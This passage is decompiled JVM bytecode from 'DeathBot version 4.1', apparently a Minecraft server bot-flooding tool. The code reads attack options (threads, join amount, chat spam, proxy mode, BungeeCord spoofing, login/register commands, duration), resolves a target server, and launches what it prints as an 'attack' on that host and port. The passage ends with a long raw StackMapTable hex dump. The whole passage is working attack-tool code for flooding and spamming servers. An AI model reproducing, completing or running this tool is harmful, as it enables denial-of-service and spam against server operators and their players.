        //   629: checkcast       Ljava/lang/String;
        //   632: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //   635: istore          26
        //   637: aload_3        
        //   638: ldc             "threads"
        //   640: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   643: iload           38
        //   645: ifne            675
        //   648: ifeq            669
        //   651: goto            655
        //   654: athrow         
        //   655: aload_3        
        //   656: ldc             "threads"
        //   658: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   661: checkcast       Ljava/lang/String;
        //   664: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //   667: istore          9
        //   669: aload_3        
        //   670: ldc             "debug"
        //   672: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   675: iload           38
        //   677: ifne            715
        //   680: ifeq            709
        //   683: goto            687
        //   686: athrow         
        //   687: aload_3        
        //   688: ldc             "debug"
        //   690: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   693: checkcast       Ljava/lang/String;
        //   696: invokestatic    java/lang/Boolean.valueOf:(Ljava/lang/String;)Ljava/lang/Boolean;
        //   699: invokevirtual   java/lang/Boolean.booleanValue:()Z
        //   702: putstatic       de/me/death/Bot.c:Z
        //   705: goto            709
        //   708: athrow         
        //   709: aload_3        
        //   710: ldc             "stay"
        //   712: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   715: iload           38
        //   717: ifne            750
        //   720: ifeq            744
        //   723: goto            727
        //   726: athrow         
        //   727: aload_3        
        //   728: ldc             "stay"
        //   730: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   733: checkcast       Ljava/lang/String;
        //   736: invokestatic    java/lang/Boolean.valueOf:(Ljava/lang/String;)Ljava/lang/Boolean;
        //   739: invokevirtual   java/lang/Boolean.booleanValue:()Z
        //   742: istore          10
        //   744: aload_3        
        //   745: ldc             "stayl"
        //   747: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   750: iload           38
        //   752: ifne            782
        //   755: ifeq            776
        //   758: goto            762
        //   761: athrow         
        //   762: aload_3        
        //   763: ldc             "stayl"
        //   765: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   768: checkcast       Ljava/lang/String;
        //   771: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //   774: istore          11
        //   776: aload_3        
        //   777: ldc             "nicks"
        //   779: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   782: iload           38
        //   784: ifne            814
        //   787: ifeq            808
        //   790: goto            794
        //   793: athrow         
        //   794: aload_3        
        //   795: ldc             "nicks"
        //   797: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   800: checkcast       Ljava/lang/String;
        //   803: invokestatic    de/me/death/c.valueOf:(Ljava/lang/String;)Lde/me/death/c;
        //   806: astore          12
        //   808: aload_3        
        //   809: ldc             "log"
        //   811: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   814: iload           38
        //   816: ifne            908
        //   819: ifeq            893
        //   822: goto            826
        //   825: athrow         
        //   826: new             Ljava/lang/StringBuilder;
        //   829: dup            
        //   830: aload_3        
        //   831: ldc             "log"
        //   833: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   836: checkcast       Ljava/lang/String;
        //   839: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   842: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   845: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   848: invokestatic    java/lang/Boolean.parseBoolean:(Ljava/lang/String;)Z
        //   851: iload           38
        //   853: ifne            908
        //   856: goto            860
        //   859: athrow         
        //   860: ifeq            893
        //   863: goto            867
        //   866: athrow         
        //   867: new             Ljava/io/File;
        //   870: dup            
        //   871: aload_0        
        //   872: invokespecial   de/me/death/Bot.c:()Ljava/lang/String;
        //   875: invokespecial   java/io/File.<init>:(Ljava/lang/String;)V
        //   878: astore          32
        //   880: aload_0        
        //   881: new             Ljava/io/PrintStream;
        //   884: dup            
        //   885: aload           32
        //   887: invokespecial   java/io/PrintStream.<init>:(Ljava/io/File;)V
        //   890: putfield        de/me/death/Bot.f:Ljava/io/PrintStream;
        //   893: aload_3        
        //   894: ldc             "bungeespoof"
        //   896: iload           38
        //   898: ifne            918
        //   901: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   904: goto            908
        //   907: athrow         
        //   908: ifeq            926
        //   911: aload_3        
        //   912: ldc             "bungeespoof"
        //   914: goto            918
        //   917: athrow         
        //   918: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   921: checkcast       Ljava/lang/String;
        //   924: astore          20
        //   926: aload_3        
        //   927: ldc             "premium"
        //   929: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   932: iload           38
        //   934: ifne            964
        //   937: ifeq            958
        //   940: goto            944
        //   943: athrow         
        //   944: aload_3        
        //   945: ldc             "premium"
        //   947: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   950: checkcast       Ljava/lang/String;
        //   953: invokestatic    java/lang/Boolean.parseBoolean:(Ljava/lang/String;)Z
        //   956: istore          14
        //   958: aload_3        
        //   959: ldc             "move"
        //   961: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   964: iload           38
        //   966: ifne            996
        //   969: ifeq            990
        //   972: goto            976
        //   975: athrow         
        //   976: aload_3        
        //   977: ldc             "move"
        //   979: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   982: checkcast       Ljava/lang/String;
        //   985: invokestatic    java/lang/Boolean.parseBoolean:(Ljava/lang/String;)Z
        //   988: istore          22
        //   990: aload_3        
        //   991: ldc             "spam"
        //   993: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   996: iload           38
        //   998: ifne            1031
        //  1001: ifeq            1025
        //  1004: goto            1008
        //  1007: athrow         
        //  1008: aload_3        
        //  1009: ldc             "spam"
        //  1011: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1014: checkcast       Ljava/lang/String;
        //  1017: invokestatic    java/lang/Boolean.valueOf:(Ljava/lang/String;)Ljava/lang/Boolean;
        //  1020: invokevirtual   java/lang/Boolean.booleanValue:()Z
        //  1023: istore          13
        //  1025: aload_3        
        //  1026: ldc             "ach"
        //  1028: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1031: iload           38
        //  1033: ifne            1067
        //  1036: ifeq            1060
        //  1039: goto            1043
        //  1042: athrow         
        //  1043: aload_3        
        //  1044: ldc             "ach"
        //  1046: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1049: checkcast       Ljava/lang/String;
        //  1052: invokestatic    java/lang/Boolean.valueOf:(Ljava/lang/String;)Ljava/lang/Boolean;
        //  1055: invokevirtual   java/lang/Boolean.booleanValue:()Z
        //  1058: istore          15
        //  1060: aload_3        
        //  1061: ldc_w           "doublej"
        //  1064: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1067: iload           38
        //  1069: ifne            1103
        //  1072: ifeq            1097
        //  1075: goto            1079
        //  1078: athrow         
        //  1079: aload_3        
        //  1080: ldc_w           "doublej"
        //  1083: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1086: checkcast       Ljava/lang/String;
        //  1089: invokestatic    java/lang/Boolean.valueOf:(Ljava/lang/String;)Ljava/lang/Boolean;
        //  1092: invokevirtual   java/lang/Boolean.booleanValue:()Z
        //  1095: istore          16
        //  1097: aload_3        
        //  1098: ldc             "joinamount"
        //  1100: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1103: iload           38
        //  1105: ifne            1135
        //  1108: ifeq            1129
        //  1111: goto            1115
        //  1114: athrow         
        //  1115: aload_3        
        //  1116: ldc             "joinamount"
        //  1118: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1121: checkcast       Ljava/lang/String;
        //  1124: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //  1127: istore          17
        //  1129: aload_3        
        //  1130: ldc             "protocol"
        //  1132: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1135: iload           38
        //  1137: ifne            1199
        //  1140: ifeq            1193
        //  1143: goto            1147
        //  1146: athrow         
        //  1147: new             Ljava/lang/StringBuilder;
        //  1150: dup            
        //  1151: aload_3        
        //  1152: ldc             "protocol"
        //  1154: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1157: checkcast       Ljava/lang/String;
        //  1160: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //  1163: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1166: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1169: astore          32
        //  1171: aload           32
        //  1173: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //  1176: invokestatic    de/me/death/d.getProtocol:(I)Lde/me/death/d;
        //  1179: astore          8
        //  1181: goto            1193
        //  1184: astore          33
        //  1186: aload           32
        //  1188: invokestatic    de/me/death/d.getProtocolByName:(Ljava/lang/String;)Lde/me/death/d;
        //  1191: astore          8
        //  1193: aload_3        
        //  1194: ldc             "ping"
        //  1196: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1199: iload           38
        //  1201: ifne            1231
        //  1204: ifeq            1225
        //  1207: goto            1211
        //  1210: athrow         
        //  1211: aload_3        
        //  1212: ldc             "ping"
        //  1214: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1217: checkcast       Ljava/lang/String;
        //  1220: invokestatic    java/lang/Boolean.parseBoolean:(Ljava/lang/String;)Z
        //  1223: istore          21
        //  1225: aload_3        
        //  1226: ldc             "pingamount"
        //  1228: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1231: iload           38
        //  1233: ifne            1263
        //  1236: ifeq            1257
        //  1239: goto            1243
        //  1242: athrow         
        //  1243: aload_3        
        //  1244: ldc             "pingamount"
        //  1246: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1249: checkcast       Ljava/lang/String;
        //  1252: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //  1255: istore          17
        //  1257: aload_3        
        //  1258: ldc             "msg"
        //  1260: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1263: iload           38
        //  1265: ifne            1292
        //  1268: ifeq            1286
        //  1271: goto            1275
        //  1274: athrow         
        //  1275: aload_3        
        //  1276: ldc             "msg"
        //  1278: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1281: checkcast       Ljava/lang/String;
        //  1284: astore          23
        //  1286: aload_3        
        //  1287: ldc             "amount"
        //  1289: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1292: iload           38
        //  1294: ifne            1324
        //  1297: ifeq            1318
        //  1300: goto            1304
        //  1303: athrow         
        //  1304: aload_3        
        //  1305: ldc             "amount"
        //  1307: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1310: checkcast       Ljava/lang/String;
        //  1313: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //  1316: istore          25
        //  1318: aload_3        
        //  1319: ldc             "proxymode"
        //  1321: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1324: iload           38
        //  1326: ifne            1356
        //  1329: ifeq            1350
        //  1332: goto            1336
        //  1335: athrow         
        //  1336: aload_3        
        //  1337: ldc             "proxymode"
        //  1339: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1342: checkcast       Ljava/lang/String;
        //  1345: invokestatic    de/me/death/b.valueOf:(Ljava/lang/String;)Lde/me/death/b;
        //  1348: astore          27
        //  1350: aload_3        
        //  1351: ldc             "login"
        //  1353: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1356: iload           38
        //  1358: ifne            1385
        //  1361: ifeq            1379
        //  1364: goto            1368
        //  1367: athrow         
        //  1368: aload_3        
        //  1369: ldc             "login"
        //  1371: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1374: checkcast       Ljava/lang/String;
        //  1377: astore          28
        //  1379: aload_3        
        //  1380: ldc             "register"
        //  1382: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1385: iload           38
        //  1387: ifne            1423
        //  1390: ifeq            1408
        //  1393: goto            1397
        //  1396: athrow         
        //  1397: aload_3        
        //  1398: ldc             "register"
        //  1400: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1403: checkcast       Ljava/lang/String;
        //  1406: astore          29
        //  1408: aload_3        
        //  1409: ldc             "username"
        //  1411: iload           38
        //  1413: ifne            1433
        //  1416: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1419: goto            1423
        //  1422: athrow         
        //  1423: ifeq            1441
        //  1426: aload_3        
        //  1427: ldc             "username"
        //  1429: goto            1433
        //  1432: athrow         
        //  1433: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1436: checkcast       Ljava/lang/String;
        //  1439: astore          5
        //  1441: aload_3        
        //  1442: ldc             "time"
        //  1444: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //  1447: iload           38
        //  1449: ifne            1478
        //  1452: ifeq            1473
        //  1455: goto            1459
        //  1458: athrow         
        //  1459: aload_3        
        //  1460: ldc             "time"
        //  1462: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //  1465: checkcast       Ljava/lang/String;
        //  1468: invokestatic    java/lang/Long.parseLong:(Ljava/lang/String;)J
        //  1471: lstore          30
        //  1473: aload           19
        //  1475: invokevirtual   java/lang/String.isEmpty:()Z
        //  1478: iload           38
        //  1480: ifne            1513
        //  1483: ifne            1511
        //  1486: goto            1490
        //  1489: athrow         
        //  1490: aload_0        
        //  1491: getfield        de/me/death/Bot.d:Lde/me/death/j;
        //  1494: new             Ljava/net/URL;
        //  1497: dup            
        //  1498: aload           19
        //  1500: invokespecial   java/net/URL.<init>:(Ljava/lang/String;)V
        //  1503: invokevirtual   de/me/death/j.a:(Ljava/net/URL;)V
        //  1506: goto            1511
        //  1509: astore          32
        //  1511: iload           24
        //  1513: ifeq            1528
        //  1516: aload_0        
        //  1517: getfield        de/me/death/Bot.d:Lde/me/death/j;
        //  1520: invokevirtual   de/me/death/j.i:()V
        //  1523: goto            1528
        //  1526: astore          32
        //  1528: aload_0        
        //  1529: aload           6
        //  1531: invokevirtual   de/me/death/Bot.b:(Ljava/lang/String;)Ljava/lang/String;
        //  1534: astore          32
        //  1536: aload           32
        //  1538: ldc_w           ""
        //  1541: invokevirtual   java/lang/String.equalsIgnoreCase:(Ljava/lang/String;)Z
        //  1544: iload           38
        //  1546: ifne            1581
        //  1549: ifne            1617
        //  1552: goto            1556
        //  1555: athrow         
        //  1556: aload           32
        //  1558: ldc_w           ":"
        //  1561: invokevirtual   java/lang/String.split:(Ljava/lang/String;)[Ljava/lang/String;
        //  1564: iconst_0       
        //  1565: aaload         
        //  1566: astore          6
        //  1568: aload           32
        //  1570: ldc_w           ":"
        //  1573: invokevirtual   java/lang/String.split:(Ljava/lang/String;)[Ljava/lang/String;
        //  1576: iconst_1       
        //  1577: aaload         
        //  1578: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //  1581: istore          7
        //  1583: getstatic       java/lang/System.out:Ljava/io/PrintStream;
        //  1586: new             Ljava/lang/StringBuilder;
        //  1589: dup            
        //  1590: ldc             "[DeathBot] Found SRV domain, real address is "
        //  1592: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1595: aload           6
        //  1597: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1600: ldc_w           ":"
        //  1603: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1606: iload           7
        //  1608: invokevirtual   java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder;
        //  1611: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1614: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1617: new             Lde/me/death/g;
        //  1620: dup            
        //  1621: iload           9
        //  1623: iload           16
        //  1625: iload           10
        //  1627: iload           13
        //  1629: iload           15
        //  1631: iconst_1       
        //  1632: iload           21
        //  1634: aload           6
        //  1636: aload           23
        //  1638: aload           28
        //  1640: aload           29
        //  1642: iload           7
        //  1644: iload           25
        //  1646: iload           11
        //  1648: aload           8
        //  1650: aload           27
        //  1652: aload           12
        //  1654: iload           14
        //  1656: iload           26
        //  1658: iload           22
        //  1660: iload           17
        //  1662: iload           18
        //  1664: aload           20
        //  1666: invokespecial   de/me/death/g.<init>:(IZZZZZZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;IIILde/me/death/d;Lde/me/death/b;Lde/me/death/c;ZIZIILjava/lang/String;)V
        //  1669: astore          33
        //  1671: aconst_null    
        //  1672: astore          34
        //  1674: aload           6
        //  1676: invokestatic    de/me/death/Bot.c:(Ljava/lang/String;)Ljava/lang/String;
        //  1679: astore          35
        //  1681: aload           35
        //  1683: invokestatic    java/net/InetAddress.getByName:(Ljava/lang/String;)Ljava/net/InetAddress;
        //  1686: astore          34
        //  1688: goto            1723
        //  1691: astore          35
        //  1693: getstatic       java/lang/System.err:Ljava/io/PrintStream;
        //  1696: new             Ljava/lang/StringBuilder;
        //  1699: dup            
        //  1700: aload           6
        //  1702: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //  1705: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1708: ldc             " is not a valid address"
        //  1710: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1713: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1716: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1719: iconst_m1      
        //  1720: invokestatic    java/lang/System.exit:(I)V
        //  1723: aload_0        
        //  1724: getfield        de/me/death/Bot.e:Lde/me/death/z;
        //  1727: aload           33
        //  1729: lload           30
        //  1731: invokevirtual   de/me/death/z.a:(Lde/me/death/g;J)V
        //  1734: aload_0        
        //  1735: getfield        de/me/death/Bot.e:Lde/me/death/z;
        //  1738: aload           34
        //  1740: iload           7
        //  1742: invokevirtual   de/me/death/z.a:(Ljava/net/InetAddress;I)Z
        //  1745: istore          35
        //  1747: iload           35
        //  1749: iload           38
        //  1751: ifne            1774
        //  1754: ifeq            1778
        //  1757: goto            1761
        //  1760: athrow         
        //  1761: getstatic       java/lang/System.err:Ljava/io/PrintStream;
        //  1764: ldc             "This server is blocked!"
        //  1766: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1769: iconst_m1      
        //  1770: goto            1774
        //  1773: athrow         
        //  1774: invokestatic    java/lang/System.exit:(I)V
        //  1777: return         
        //  1778: aconst_null    
        //  1779: astore          36
        //  1781: aload           5
        //  1783: iload           38
        //  1785: ifne            1797
        //  1788: ifnull          1850
        //  1791: goto            1795
        //  1794: athrow         
        //  1795: aload           5
        //  1797: ldc_w           ""
        //  1800: invokevirtual   java/lang/String.equals:(Ljava/lang/Object;)Z
        //  1803: ifne            1850
        //  1806: new             Ljava/io/File;
        //  1809: dup            
        //  1810: aload           5
        //  1812: invokespecial   java/io/File.<init>:(Ljava/lang/String;)V
        //  1815: astore          36
        //  1817: aload           36
        //  1819: iload           38
        //  1821: ifne            1970
        //  1824: invokevirtual   java/io/File.exists:()Z
        //  1827: ifne            1850
        //  1830: goto            1834
        //  1833: athrow         
        //  1834: aload           36
        //  1836: invokevirtual   java/io/File.createNewFile:()Z
        //  1839: pop            
        //  1840: goto            1850
        //  1843: astore          37
        //  1845: aload           37
        //  1847: invokevirtual   java/lang/Exception.printStackTrace:()V
        //  1850: getstatic       java/lang/System.out:Ljava/io/PrintStream;
        //  1853: ldc             "Welcome to DeathBot version 4.1"
        //  1855: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1858: getstatic       java/lang/System.out:Ljava/io/PrintStream;
        //  1861: aload_0        
        //  1862: getfield        de/me/death/Bot.e:Lde/me/death/z;
        //  1865: invokevirtual   de/me/death/z.a:()Ljava/lang/String;
        //  1868: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1871: getstatic       java/lang/System.out:Ljava/io/PrintStream;
        //  1874: new             Ljava/lang/StringBuilder;
        //  1877: dup            
        //  1878: ldc             "[DeathBot] Starting attack to "
        //  1880: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1883: aload           6
        //  1885: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1888: ldc_w           ":"
        //  1891: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1894: iload           7
        //  1896: invokevirtual   java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder;
        //  1899: ldc             " using protocol "
        //  1901: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1904: aload           8
        //  1906: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //  1909: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1912: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1915: aload_0        
        //  1916: getfield        de/me/death/Bot.g:Lde/me/death/i;
        //  1919: aload           33
        //  1921: invokevirtual   de/me/death/i.a:(Lde/me/death/g;)V
        //  1924: getstatic       java/util/concurrent/TimeUnit.SECONDS:Ljava/util/concurrent/TimeUnit;
        //  1927: lload           30
        //  1929: invokevirtual   java/util/concurrent/TimeUnit.toNanos:(J)J
        //  1932: invokestatic    java/util/concurrent/locks/LockSupport.parkNanos:(J)V
        //  1935: getstatic       java/lang/System.err:Ljava/io/PrintStream;
        //  1938: new             Ljava/lang/StringBuilder;
        //  1941: dup            
        //  1942: ldc_w           "[DeathBot] Stopped attack to "
        //  1945: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1948: aload           6
        //  1950: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1953: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1956: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //  1959: iload           38
        //  1961: ifne            1987
        //  1964: aload           36
        //  1966: goto            1970
        //  1969: athrow         
        //  1970: ifnull          1983
        //  1973: aload           36
        //  1975: invokevirtual   java/io/File.delete:()Z
        //  1978: pop            
        //  1979: goto            1983
        //  1982: athrow         
        //  1983: iconst_0       
        //  1984: invokestatic    java/lang/System.exit:(I)V
        //  1987: return         
        //    StackMapTable: 00 B7 FF 00 26 00 27 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 4F 07 01 97 40 01 10 52 07 01 97 00 5A 07 01 97 00 FF 00 09 00 27 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 02 01 01 4A 07 01 97 00 4E 07 01 97 40 01 46 07 01 97 00 5A 07 01 97 00 55 01 05 48 07 01 97 40 07 01 4E 47 07 01 97 FF 00 00 00 27 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 02 01 01 5E 07 01 97 00 59 07 00 04 08 49 01 00 02 FF 00 7B 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 05 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 05 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 00 00 00 00 00 00 01 00 01 07 01 97 00 0D 45 01 4A 07 01 97 00 0A 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 55 07 01 97 00 45 01 4A 07 01 97 00 17 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 54 07 01 97 00 45 01 4A 07 01 97 00 10 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 60 07 01 97 40 01 45 07 01 97 00 19 4D 07 01 97 40 01 48 07 01 97 FF 00 00 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 05 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 05 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 00 00 00 00 00 00 01 00 02 07 01 9C 07 00 1D FF 00 07 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 05 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 00 00 00 00 00 00 01 00 00 50 07 01 97 00 0D 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 10 45 01 4A 07 01 97 00 10 46 01 4A 07 01 97 00 11 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 FF 00 24 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 05 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 00 00 00 00 00 01 00 01 07 01 97 FF 00 08 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 05 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 00 00 00 00 00 00 01 00 00 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 0A 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 0D 45 01 4A 07 01 97 00 0A 45 01 4A 07 01 97 00 0A 4D 07 01 97 40 01 48 07 01 97 FF 00 00 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 05 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 00 00 00 00 00 00 01 00 02 07 01 9C 07 00 1D FF 00 07 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 00 00 00 00 00 00 01 00 00 50 07 01 97 00 0D 44 01 4A 07 01 97 00 52 07 01 97 01 41 01 4C 07 01 97 01 FF 00 1A 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 00 00 00 00 00 01 00 01 07 01 97 00 58 01 23 FF 00 49 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 07 02 3F 07 02 46 00 00 00 01 00 01 07 01 97 FF 00 1F 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 07 02 3F 07 02 46 07 00 04 00 00 01 00 00 FF 00 24 00 26 07 00 02 07 01 4E 07 01 99 07 01 9C 07 01 99 07 00 1D 07 00 1D 01 07 01 CC 01 01 01 07 01 D2 01 01 01 01 01 01 07 00 1D 07 00 1D 01 01 07 00 1D 01 01 01 07 01 D8 07 00 1D 07 00 1D 04 07 00 1D 07 02 3F 07 02 46 01 00 00 01 00 01 07 01 97 00 4B 07 01 97 40 01 03 FF 00 0F 00 26 07 00 02 07 01 4E 